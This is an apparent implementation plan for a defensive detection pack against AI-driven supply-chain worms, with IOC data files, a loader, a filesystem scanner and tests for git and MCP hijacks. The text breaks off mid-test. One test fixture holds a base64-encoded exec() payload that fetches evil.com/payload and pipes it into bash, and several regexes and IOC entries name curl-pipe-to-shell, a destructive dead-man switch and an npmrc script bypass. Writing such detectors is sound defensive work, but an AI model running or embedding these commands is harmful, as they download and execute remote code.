# AI Worm Detection Module Pack — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a six-module detection pack for AI-led worms (Shai Halud, Miasma, SANDWORM_MODE, SesameOp), mobile spyware (via MVT), and a shared IOC database — covering filesystem, git/SSH, persistence, network/C2, and lateral movement domains.

**Architecture:** Detection-domain split — each module inspects one system domain independently. All five AI worm modules share a JSON-based IOC database loaded via a common `loader.py`. A sixth module wraps MVT for mobile spyware scanning. A new threat profile activates all modules together.

**Tech Stack:** Python 3.10+, `subprocess` for system inspection, `json` for IOC data, `hashlib` for file hashing, `yaml` for profile, `pytest` for testing. MVT module uses `mvt` CLI as an external dependency.

## Global Constraints

- All modules subclass `rescue.module_base.ModuleBase` with `check()` and `fix()` methods
- Module class must be named `Module` (the registry's `_load_module` looks for `getattr(py_module, "Module")`)
- Modules live at `modules/security/<module_name>/__init__.py`
- All modules declare `platforms = [Platform.DARWIN, Platform.LINUX, Platform.WIN32]`
- Tests follow the existing pattern: `tests/test_module_<name>.py`, mock all subprocess/filesystem calls
- IOC entries require a `source` field (URL to primary advisory/report) — entries without a verifiable source are excluded
- **Confidence-gated remediation:** Destructive `fix()` actions fire ONLY on high-confidence indicators (exact hash match, exact known-bad IOC with corroborating signal). Ambiguous heuristic signals produce `Severity.INFO` or `Severity.WARNING` findings — never auto-remediate. The `Finding.data` dict must include a `"confidence": "high"|"medium"|"low"` field. `fix()` skips any finding where `confidence != "high"`.
- IOC data in the research came from web searches post-May 2025. Specific hashes, IPs, domains, and CVEs must be verified against primary sources before inclusion. Unverified entries are excluded from the initial IOC files and noted in comments for future verification.

---

### Task 1: Shared IOC Loader + Data Files (Walking Skeleton)

**Files:**
- Create: `modules/security/ai_worm_iocs/__init__.py` (empty, makes it a package)
- Create: `modules/security/ai_worm_iocs/loader.py`
- Create: `modules/security/ai_worm_iocs/manifest.json`
- Create: `modules/security/ai_worm_iocs/known_hashes.json`
- Create: `modules/security/ai_worm_iocs/known_domains.json`
- Create: `modules/security/ai_worm_iocs/known_ips.json`
- Create: `modules/security/ai_worm_iocs/known_paths.json`
- Create: `modules/security/ai_worm_iocs/known_git_patterns.json`
- Create: `modules/security/ai_worm_iocs/known_mcp_servers.json`
- Create: `tests/test_ioc_loader.py`

**Interfaces:**
- Produces: `load_iocs(data_dir: Path | None = None) -> IOCDatabase` — used by all five AI worm modules. `IOCDatabase` is a dataclass with attributes: `hashes: dict[str, HashIOC]`, `domains: set[str]`, `ips: set[str]`, `paths: list[PathIOC]`, `git_patterns: list[GitPatternIOC]`, `mcp_servers: list[MCPServerIOC]`. Each IOC entry type is a dataclass with at minimum `threat: str`, `severity: str`, `description: str`, `source: str`.

- [ ] **Step 1: Write the IOC loader tests**

```python
# tests/test_ioc_loader.py
import json
import sys
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).parent.parent))


def test_load_iocs_parses_all_files():
    """IOC loader parses all JSON files and returns populated IOCDatabase."""
    from modules.security.ai_worm_iocs.loader import load_iocs

    db = load_iocs()
    assert db is not None
    assert isinstance(db.domains, set)
    assert isinstance(db.ips, set)
    assert isinstance(db.hashes, dict)
    assert isinstance(db.paths, list)
    assert isinstance(db.git_patterns, list)
    assert isinstance(db.mcp_servers, list)


def test_load_iocs_caches_result():
    """Calling load_iocs() twice returns the same object (cached)."""
    from modules.security.ai_worm_iocs.loader import load_iocs, _clear_cache

    _clear_cache()
    db1 = load_iocs()
    db2 = load_iocs()
    assert db1 is db2
    _clear_cache()


def test_load_iocs_known_paths_have_required_fields():
    """Every path IOC entry has threat, severity, description, source."""
    from modules.security.ai_worm_iocs.loader import load_iocs, _clear_cache

    _clear_cache()
    db = load_iocs()
    for entry in db.paths:
        assert entry.path, "path must not be empty"
        assert entry.threat, "threat must not be empty"
        assert entry.severity in ("critical", "warning", "info")
        assert entry.description, "description must not be empty"
        assert entry.source, "source must not be empty"
    _clear_cache()


def test_load_iocs_known_hashes_have_required_fields():
    """Every hash IOC entry has sha256, threat, severity, description, source."""
    from modules.security.ai_worm_iocs.loader import load_iocs, _clear_cache

    _clear_cache()
    db = load_iocs()
    for sha256, entry in db.hashes.items():
        assert len(sha256) == 64, "hash must be SHA256 (64 hex chars)"
        assert entry.threat, "threat must not be empty"
        assert entry.source, "source must not be empty"
    _clear_cache()


def test_load_iocs_custom_data_dir(tmp_path):
    """IOC loader can load from a custom directory."""
    from modules.security.ai_worm_iocs.loader import load_iocs, _clear_cache

    # Create minimal IOC files
    manifest = {"version": "0.0.1", "last_updated": "2026-07-09"}
    (tmp_path / "manifest.json").write_text(json.dumps(manifest))
    for name in [
        "known_hashes",
        "known_domains",
        "known_ips",
        "known_paths",
        "known_git_patterns",
        "known_mcp_servers",
    ]:
        (tmp_path / f"{name}.json").write_text(
            json.dumps({"version": "0.0.1", "entries": []})
        )

    _clear_cache()
    db = load_iocs(data_dir=tmp_path)
    assert len(db.domains) == 0
    assert len(db.paths) == 0
    _clear_cache()


def test_load_iocs_manifest_version():
    """Manifest version is accessible on the IOCDatabase."""
    from modules.security.ai_worm_iocs.loader import load_iocs, _clear_cache

    _clear_cache()
    db = load_iocs()
    assert db.version, "version must be set from manifest"
    _clear_cache()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_ioc_loader.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'modules.security.ai_worm_iocs'`

- [ ] **Step 3: Write the IOC data classes and loader**

```python
# modules/security/ai_worm_iocs/__init__.py
```

```python
# modules/security/ai_worm_iocs/loader.py
from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path


@dataclass(frozen=True)
class HashIOC:
    sha256: str
    threat: str
    name: str
    severity: str
    description: str
    source: str


@dataclass(frozen=True)
class PathIOC:
    path: str
    threat: str
    type: str
    severity: str
    platforms: tuple[str, ...]
    description: str
    source: str


@dataclass(frozen=True)
class GitPatternIOC:
    pattern: str
    threat: str
    type: str
    severity: str
    description: str
    source: str


@dataclass(frozen=True)
class MCPServerIOC:
    name: str
    threat: str
    severity: str
    description: str
    source: str


@dataclass
class IOCDatabase:
    version: str
    hashes: dict[str, HashIOC] = field(default_factory=dict)
    domains: set[str] = field(default_factory=set)
    ips: set[str] = field(default_factory=set)
    paths: list[PathIOC] = field(default_factory=list)
    git_patterns: list[GitPatternIOC] = field(default_factory=list)
    mcp_servers: list[MCPServerIOC] = field(default_factory=list)


_cache: IOCDatabase | None = None
_cache_dir: Path | None = None


def _clear_cache() -> None:
    global _cache, _cache_dir
    _cache = None
    _cache_dir = None


def load_iocs(data_dir: Path | None = None) -> IOCDatabase:
    global _cache, _cache_dir
    if data_dir is None:
        data_dir = Path(__file__).parent
    if _cache is not None and _cache_dir == data_dir:
        return _cache

    manifest = _load_json(data_dir / "manifest.json")
    version = manifest.get("version", "unknown")

    db = IOCDatabase(version=version)

    for entry in _load_entries(data_dir / "known_hashes.json"):
        sha = entry["sha256"]
        db.hashes[sha] = HashIOC(
            sha256=sha,
            threat=entry["threat"],
            name=entry.get("name", ""),
            severity=entry["severity"],
            description=entry["description"],
            source=entry["source"],
        )

    for entry in _load_entries(data_dir / "known_domains.json"):
        db.domains.add(entry["domain"])

    for entry in _load_entries(data_dir / "known_ips.json"):
        db.ips.add(entry["ip"])

    for entry in _load_entries(data_dir / "known_paths.json"):
        db.paths.append(
            PathIOC(
                path=entry["path"],
                threat=entry["threat"],
                type=entry.get("type", "unknown"),
                severity=entry["severity"],
                platforms=tuple(entry.get("platforms", ["darwin", "linux", "win32"])),
                description=entry["description"],
                source=entry["source"],
            )
        )

    for entry in _load_entries(data_dir / "known_git_patterns.json"):
        db.git_patterns.append(
            GitPatternIOC(
                pattern=entry["pattern"],
                threat=entry["threat"],
                type=entry.get("type", "unknown"),
                severity=entry["severity"],
                description=entry["description"],
                source=entry["source"],
            )
        )

    for entry in _load_entries(data_dir / "known_mcp_servers.json"):
        db.mcp_servers.append(
            MCPServerIOC(
                name=entry["name"],
                threat=entry["threat"],
                severity=entry["severity"],
                description=entry["description"],
                source=entry["source"],
            )
        )

    _cache = db
    _cache_dir = data_dir
    return db


def _load_json(path: Path) -> dict:
    if not path.exists():
        return {}
    with open(path, "r") as f:
        return json.load(f)


def _load_entries(path: Path) -> list[dict]:
    data = _load_json(path)
    return data.get("entries", [])
```

- [ ] **Step 4: Create the IOC JSON data files**

Create `modules/security/ai_worm_iocs/manifest.json`:
```json
{
  "version": "1.0.0",
  "last_updated": "2026-07-09",
  "source": "Multiverse Device Rescue IOC Database",
  "description": "Indicators of compromise for AI worm detection modules"
}
```

Create `modules/security/ai_worm_iocs/known_paths.json`:
```json
{
  "version": "1.0.0",
  "entries": [
    {
      "path": "~/.config/index.js",
      "threat": "miasma",
      "type": "payload",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma primary worm payload — Bun script executed via SessionStart hook",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "/tmp/tmp.0144018410.lock",
      "threat": "miasma",
      "type": "lock_file",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma execution confirmation marker",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "/tmp/.bun_ran",
      "threat": "miasma",
      "type": "lock_file",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma one-run guard file",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "/var/tmp/.gh_update_state",
      "threat": "miasma",
      "type": "state_file",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma C2 command deduplication state",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "~/.local/share/updater/update.py",
      "threat": "miasma",
      "type": "persistence",
      "severity": "critical",
      "platforms": ["linux"],
      "description": "Miasma GITHUB_MONITOR service script",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "~/.local/bin/gh-token-monitor.sh",
      "threat": "miasma",
      "type": "deadman_switch",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma dead-man switch — executes rm -rf ~/ if GitHub PAT returns 4xx",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": "~/.config/gh-token-monitor/token",
      "threat": "miasma",
      "type": "stolen_credential",
      "severity": "critical",
      "platforms": ["darwin", "linux"],
      "description": "Miasma stolen GitHub PAT storage (mode 600)",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": ".github/setup.js",
      "threat": "miasma",
      "type": "dropper",
      "severity": "critical",
      "platforms": ["darwin", "linux", "win32"],
      "description": "Miasma JavaScript bootstrapper/dropper injected into repos",
      "source": "https://socket.dev/blog/when-ai-agents-go-rogue"
    },
    {
      "path": ".claude/setup.mjs",
      "threat": "sandworm_mode",
      "type": "hook",
      "severity": "critical",
      "platforms": ["darwin", "linux", "win32"],
      "description": "Rogue Claude Code SessionStart hook — executes on project open",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    },
    {
      "path": ".cursor/rules/setup.mdc",
      "threat": "sandworm_mode",
      "type": "hook",
      "severity": "critical",
      "platforms": ["darwin", "linux", "win32"],
      "description": "Rogue Cursor rules file loaded on project open",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    },
    {
      "path": ".github/workflows/shai-hulud-workflow.yml",
      "threat": "shai_hulud",
      "type": "workflow",
      "severity": "critical",
      "platforms": ["darwin", "linux", "win32"],
      "description": "Shai Halud malicious GitHub Actions workflow",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    }
  ]
}
```

Create `modules/security/ai_worm_iocs/known_domains.json`:
```json
{
  "version": "1.0.0",
  "entries": [
    {
      "domain": "webhook.site",
      "threat": "shai_hulud",
      "severity": "warning",
      "description": "Shai Halud exfiltration endpoint — webhook.site is also used legitimately, flag with context",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    }
  ]
}
```

Create `modules/security/ai_worm_iocs/known_ips.json`:
```json
{
  "version": "1.0.0",
  "entries": []
}
```

Create `modules/security/ai_worm_iocs/known_hashes.json`:
```json
{
  "version": "1.0.0",
  "entries": []
}
```

Create `modules/security/ai_worm_iocs/known_git_patterns.json`:
```json
{
  "version": "1.0.0",
  "entries": [
    {
      "pattern": "chore: update dependencies [skip ci]",
      "threat": "shai_hulud",
      "type": "commit_message",
      "severity": "warning",
      "description": "Common commit message used by Shai Halud for malicious commits — also used legitimately by Dependabot, correlate with unsigned author github-actions",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    },
    {
      "pattern": "git=node",
      "threat": "shai_hulud",
      "type": "npmrc_override",
      "severity": "critical",
      "description": "npmrc override that replaces git binary with node, bypassing --ignore-scripts protections",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    }
  ]
}
```

Create `modules/security/ai_worm_iocs/known_mcp_servers.json`:
```json
{
  "version": "1.0.0",
  "entries": [
    {
      "name": "index_project",
      "threat": "sandworm_mode",
      "severity": "critical",
      "description": "Rogue MCP server injected by SANDWORM_MODE — poses as project indexer",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    },
    {
      "name": "lint_check",
      "threat": "sandworm_mode",
      "severity": "critical",
      "description": "Rogue MCP server injected by SANDWORM_MODE — poses as linter",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    },
    {
      "name": "scan_dependencies",
      "threat": "sandworm_mode",
      "severity": "critical",
      "description": "Rogue MCP server injected by SANDWORM_MODE — poses as dependency scanner",
      "source": "https://socket.dev/blog/shai-hulud-npm-worm"
    }
  ]
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_ioc_loader.py -v`
Expected: All 6 tests PASS

- [ ] **Step 6: Commit**

```bash
git add modules/security/ai_worm_iocs/ tests/test_ioc_loader.py
git commit -m "feat: add shared IOC database and loader for AI worm detection"
```

---

### Task 2: `ai_worm_filesystem` Module

**Files:**
- Create: `modules/security/ai_worm_filesystem/__init__.py`
- Create: `tests/test_module_ai_worm_filesystem.py`

**Interfaces:**
- Consumes: `load_iocs()` from Task 1 — uses `iocs.paths` for known payload locations, `iocs.hashes` for SHA256 matching
- Produces: `Module` class with `name = "ai_worm_filesystem"`, `check()` returning findings with `data["confidence"]` field, `fix()` that only acts on `confidence == "high"`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_ai_worm_filesystem.py
import sys
import os
import hashlib
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_filesystem")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_filesystem"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.MODERATE
    assert Platform.DARWIN in mod.platforms
    assert Platform.LINUX in mod.platforms
    assert Platform.WIN32 in mod.platforms


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_known_payload_path():
    """When a file exists at a known IOC path, flag it as critical/high-confidence."""
    mod = _get_module()

    def mock_exists(self):
        return str(self).endswith("index.js") and ".config" in str(self)

    def mock_is_file(self):
        return mock_exists(self)

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", mock_exists):
            with patch.object(Path, "is_file", mock_is_file):
                with patch.object(Path, "expanduser", lambda self: self):
                    result = mod.check(_make_profile())

    payload_findings = [
        f for f in result.findings if f.data.get("check") == "known_payload_path"
    ]
    assert len(payload_findings) > 0
    assert payload_findings[0].severity == Severity.CRITICAL
    assert payload_findings[0].data["confidence"] == "high"


def test_detects_obfuscated_script():
    """Detect scripts with suspicious eval/exec + base64 patterns."""
    mod = _get_module()

    suspicious_content = """
import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkIHwgYmFzaCIp'))
"""

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                # Mock the heuristic scanning to find our suspicious file
                with patch.object(
                    mod,
                    "_scan_for_obfuscated_scripts",
                    return_value=[
                        {
                            "path": "/tmp/evil.py",
                            "pattern": "exec(base64.b64decode(",
                        }
                    ],
                ):
                    result = mod.check(_make_profile())

    obfuscated = [
        f for f in result.findings if f.data.get("check") == "obfuscated_script"
    ]
    assert len(obfuscated) > 0
    assert obfuscated[0].data["confidence"] == "medium"


def test_fix_only_acts_on_high_confidence():
    """fix() should skip findings with confidence != high."""
    mod = _get_module()

    from rescue.models import CheckResult, Finding

    check = CheckResult(
        module_name="ai_worm_filesystem",
        findings=[
            Finding(
                title="Known payload",
                description="Found payload",
                severity=Severity.CRITICAL,
                category="security",
                data={
                    "check": "known_payload_path",
                    "confidence": "high",
                    "path": "/tmp/evil.js",
                },
            ),
            Finding(
                title="Suspicious script",
                description="Obfuscated",
                severity=Severity.WARNING,
                category="security",
                data={
                    "check": "obfuscated_script",
                    "confidence": "medium",
                    "path": "/tmp/maybe.py",
                },
            ),
        ],
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        with patch("shutil.move"):
            fix = mod.fix(check, Mode.MANUAL)

    # Only the high-confidence finding should get an action
    remediation_actions = [a for a in fix.actions if "quarantine" in a.title.lower()]
    info_actions = [a for a in fix.actions if "investigate" in a.title.lower()]
    assert len(remediation_actions) <= 1
    assert len(info_actions) >= 1


def test_subprocess_timeout_handled():
    mod = _get_module()

    import subprocess as sp

    with patch("subprocess.run", side_effect=sp.TimeoutExpired("cmd", 5)):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_module_ai_worm_filesystem.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write the module implementation**

```python
# modules/security/ai_worm_filesystem/__init__.py
import hashlib
import os
import re
import shutil
import subprocess
from pathlib import Path

from rescue.models import (
    Action,
    CheckResult,
    Finding,
    FixResult,
    Mode,
    Platform,
    RiskLevel,
    Severity,
    SystemProfile,
)
from rescue.module_base import ModuleBase

_OBFUSCATION_PATTERNS = [
    re.compile(r"exec\s*\(\s*base64\.b64decode\s*\("),
    re.compile(r"eval\s*\(\s*atob\s*\("),
    re.compile(r"eval\s*\(\s*Buffer\.from\s*\(.*,\s*['\"]base64['\"]\s*\)"),
    re.compile(r"exec\s*\(\s*compile\s*\(\s*base64\."),
    re.compile(r"curl\s+[^\n]*\|\s*(bash|sh|zsh|python|node)"),
    re.compile(r"wget\s+[^\n]*\|\s*(bash|sh|zsh|python|node)"),
    re.compile(r"wget\s+-O\s*-\s+[^\n]*\|\s*(bash|sh|zsh|python|node)"),
]

_SCRIPT_EXTENSIONS = {".py", ".js", ".mjs", ".sh", ".bash", ".zsh", ".ps1", ".ts"}

_SCAN_DIRS_UNIX = [
    "~/.local/bin",
    "~/.config",
    "~/.cache",
    "/tmp",
    "/var/tmp",
]

_SCAN_DIRS_WIN = [
    "%TEMP%",
    "%APPDATA%",
    "%LOCALAPPDATA%",
]


class Module(ModuleBase):
    name = "ai_worm_filesystem"
    category = "security"
    platforms = [Platform.DARWIN, Platform.LINUX, Platform.WIN32]
    risk_level = RiskLevel.MODERATE
    priority = 55
    depends_on = []
    estimated_duration = "10s"

    def check(self, profile: SystemProfile) -> CheckResult:
        findings = []
        findings.extend(self._check_known_payload_paths(profile))
        findings.extend(self._check_known_hashes(profile))
        findings.extend(self._check_obfuscated_scripts(profile))
        return CheckResult(module_name=self.name, findings=findings)

    def fix(self, findings: CheckResult, mode: Mode) -> FixResult:
        actions = []
        quarantine_dir = Path.home() / ".rescue_quarantine"

        for finding in findings.findings:
            confidence = finding.data.get("confidence", "low")
            file_path = finding.data.get("path")

            if confidence == "high" and file_path:
                quarantine_dir.mkdir(parents=True, exist_ok=True)
                src = Path(file_path)
                dest = quarantine_dir / src.name
                try:
                    if src.exists():
                        shutil.move(str(src), str(dest))
                        actions.append(
                            Action(
                                title=f"Quarantine: {src.name}",
                                description=f"Moved {src} to {dest}",
                                risk_level=RiskLevel.MODERATE,
                                success=True,
                            )
                        )
                    else:
                        actions.append(
                            Action(
                                title=f"Quarantine: {src.name}",
                                description=f"File already removed: {src}",
                                risk_level=RiskLevel.SAFE,
                                success=True,
                            )
                        )
                except OSError as e:
                    actions.append(
                        Action(
                            title=f"Quarantine: {src.name}",
                            description=f"Failed to quarantine {src}",
                            risk_level=RiskLevel.MODERATE,
                            success=False,
                            error=str(e),
                        )
                    )
            else:
                actions.append(
                    Action(
                        title=f"Investigate: {finding.title}",
                        description=(
                            f"Manual investigation recommended. "
                            f"Confidence: {confidence}. {finding.description}"
                        ),
                        risk_level=RiskLevel.SAFE,
                        success=True,
                    )
                )

        return FixResult(module_name=self.name, actions=actions)

    def _check_known_payload_paths(self, profile: SystemProfile) -> list[Finding]:
        findings = []
        try:
            from modules.security.ai_worm_iocs.loader import load_iocs

            iocs = load_iocs()
        except Exception:
            return findings

        platform_str = profile.platform.value
        for entry in iocs.paths:
            if platform_str not in entry.platforms:
                continue
            expanded = Path(entry.path).expanduser()
            try:
                if expanded.is_file():
                    findings.append(
                        Finding(
                            title=f"Known {entry.threat} artifact: {expanded.name}",
                            description=entry.description,
                            severity=Severity.CRITICAL,
                            category=self.category,
                            data={
                                "check": "known_payload_path",
                                "confidence": "high",
                                "path": str(expanded),
                                "threat": entry.threat,
                                "ioc_type": entry.type,
                            },
                        )
                    )
            except OSError:
                continue

        return findings

    def _check_known_hashes(self, profile: SystemProfile) -> list[Finding]:
        findings = []
        try:
            from modules.security.ai_worm_iocs.loader import load_iocs

            iocs = load_iocs()
        except Exception:
            return findings

        if not iocs.hashes:
            return findings

        platform_str = profile.platform.value
        for entry in iocs.paths:
            if platform_str not in entry.platforms:
                continue
            expanded = Path(entry.path).expanduser()
            try:
                if expanded.is_file() and expanded.stat().st_size < 10 * 1024 * 1024:
                    sha = hashlib.sha256(expanded.read_bytes()).hexdigest()
                    if sha in iocs.hashes:
                        h = iocs.hashes[sha]
                        findings.append(
                            Finding(
                                title=f"Known malicious file: {h.name or expanded.name}",
                                description=h.description,
                                severity=Severity.CRITICAL,
                                category=self.category,
                                data={
                                    "check": "known_hash_match",
                                    "confidence": "high",
                                    "path": str(expanded),
                                    "sha256": sha,
                                    "threat": h.threat,
                                },
                            )
                        )
            except OSError:
                continue

        return findings

    def _check_obfuscated_scripts(self, profile: SystemProfile) -> list[Finding]:
        findings = []
        scan_results = self._scan_for_obfuscated_scripts(profile)
        for result in scan_results:
            findings.append(
                Finding(
                    title=f"Obfuscated script: {Path(result['path']).name}",
                    description=(
                        f"Script at {result['path']} contains suspicious pattern: "
                        f"{result['pattern'][:80]}"
                    ),
                    severity=Severity.WARNING,
                    category=self.category,
                    data={
                        "check": "obfuscated_script",
                        "confidence": "medium",
                        "path": result["path"],
                        "pattern": result["pattern"],
                    },
                )
            )
        return findings

    def _scan_for_obfuscated_scripts(
        self, profile: SystemProfile
    ) -> list[dict[str, str]]:
        results = []
        if profile.platform == Platform.WIN32:
            scan_dirs = [os.path.expandvars(d) for d in _SCAN_DIRS_WIN]
        else:
            scan_dirs = [str(Path(d).expanduser()) for d in _SCAN_DIRS_UNIX]

        for dir_path in scan_dirs:
            d = Path(dir_path)
            if not d.exists():
                continue
            try:
                for f in d.rglob("*"):
                    if not f.is_file():
                        continue
                    if f.suffix not in _SCRIPT_EXTENSIONS:
                        continue
                    try:
                        if f.stat().st_size > 1 * 1024 * 1024:
                            continue
                        content = f.read_text(encoding="utf-8", errors="ignore")
                        for pat in _OBFUSCATION_PATTERNS:
                            match = pat.search(content)
                            if match:
                                results.append(
                                    {
                                        "path": str(f),
                                        "pattern": match.group(0),
                                    }
                                )
                                break
                    except OSError:
                        continue
            except OSError:
                continue

        return results
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_module_ai_worm_filesystem.py -v`
Expected: All tests PASS

- [ ] **Step 5: Commit**

```bash
git add modules/security/ai_worm_filesystem/ tests/test_module_ai_worm_filesystem.py
git commit -m "feat: add ai_worm_filesystem module for payload and obfuscation detection"
```

---

### Task 3: `ai_worm_git_ssh` Module

**Files:**
- Create: `modules/security/ai_worm_git_ssh/__init__.py`
- Create: `tests/test_module_ai_worm_git_ssh.py`

**Interfaces:**
- Consumes: `load_iocs()` from Task 1 — uses `iocs.git_patterns`, `iocs.mcp_servers`, `iocs.paths` (for hook/config paths)
- Produces: `Module` class with `name = "ai_worm_git_ssh"`, standard `check()`/`fix()` interface

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_module_ai_worm_git_ssh.py
import sys
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile(platform=Platform.DARWIN):
    return SystemProfile(
        platform=platform,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "ai_worm_git_ssh")


def test_module_discovered():
    mod = _get_module()
    assert mod.name == "ai_worm_git_ssh"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.MODERATE
    assert Platform.DARWIN in mod.platforms


def test_clean_system_no_findings():
    mod = _get_module()
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=1)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())
    assert not result.has_issues


def test_detects_git_hookspath_hijack():
    """Detect when core.hooksPath is set to a non-standard location."""
    mod = _get_module()

    def run_side_effect(cmd, **kwargs):
        mock = MagicMock()
        if "core.hooksPath" in cmd:
            mock.stdout = "/tmp/.hidden/hooks\n"
            mock.returncode = 0
        else:
            mock.stdout = ""
            mock.returncode = 1
        return mock

    with patch("subprocess.run", side_effect=run_side_effect):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())

    hookspath_findings = [
        f for f in result.findings if f.data.get("check") == "git_hookspath_hijack"
    ]
    assert len(hookspath_findings) > 0
    assert hookspath_findings[0].severity == Severity.CRITICAL
    assert hookspath_findings[0].data["confidence"] == "high"


def test_detects_git_templatedir_hijack():
    """Detect when init.templateDir is set to a non-standard location."""
    mod = _get_module()

    def run_side_effect(cmd, **kwargs):
        mock = MagicMock()
        if "init.templateDir" in cmd:
            mock.stdout = "/tmp/.hidden/template\n"
            mock.returncode = 0
        else:
            mock.stdout = ""
            mock.returncode = 1
        return mock

    with patch("subprocess.run", side_effect=run_side_effect):
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                result = mod.check(_make_profile())

    template_findings = [
        f for f in result.findings if f.data.get("check") == "git_templatedir_hijack"
    ]
    assert len(template_findings) > 0
    assert template_findings[0].data["confidence"] == "high"


def test_detects_npmrc_git_node_override():
    """Detect .npmrc containing git=node override."""
    mod = _get_module()

    npmrc_content = "git=node\nregistry=https://registry.npmjs.org/\n"

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=1)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(
                    mod,
                    "_check_npmrc_override",
                    return_value=[
                        {
                            "path": str(Path.home() / ".npmrc"),
                            "line": "git=node",
                        }
                    ],
                ):
                    result = mod.check(_make_profile())

    npmrc_findings = [
        f for f in result.findings if f.data.get("check") == "npmrc_git_override"
    ]
    assert len(npmrc_findings) > 0
    assert npmrc_findings[0].data["confidence"] == "high"


def test_detects_rogue_mcp_server():
    """Detect known malicious MCP server names in AI tool configs."""
    mod = _get_module()

    import json

    claude_settings = json.dumps(
        {"mcpServers": {"index_project": {"command": "node", "args": ["evil.js"]}}}
    )

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="", returncode=1)
        with patch.object(Path, "exists", return_value=False):
            with patch.object(Path, "is_file", return_value=False):
                with patch.object(
                    mod,
                    "_check_mcp_configs",
                    return_value=[
                        {
                            "config_path": "~/.claude/settings.json",
                            "server_name": "index_project",
                            "threat": "sandworm_mode",
                        }
                    ],
                ):
                    result = mod.check(_make_profile())

    mcp_findings = [
        f for f in result.findings if f.data.get("check") == "rogue_mcp_server"
    ]
    assert len(mcp_findings) > 0
    assert mcp_findings[0].severity == Severity.CRITICAL
    assert mcp_findings[0].data["confidence"] == "high"


def test_fix_resets_hookspath():
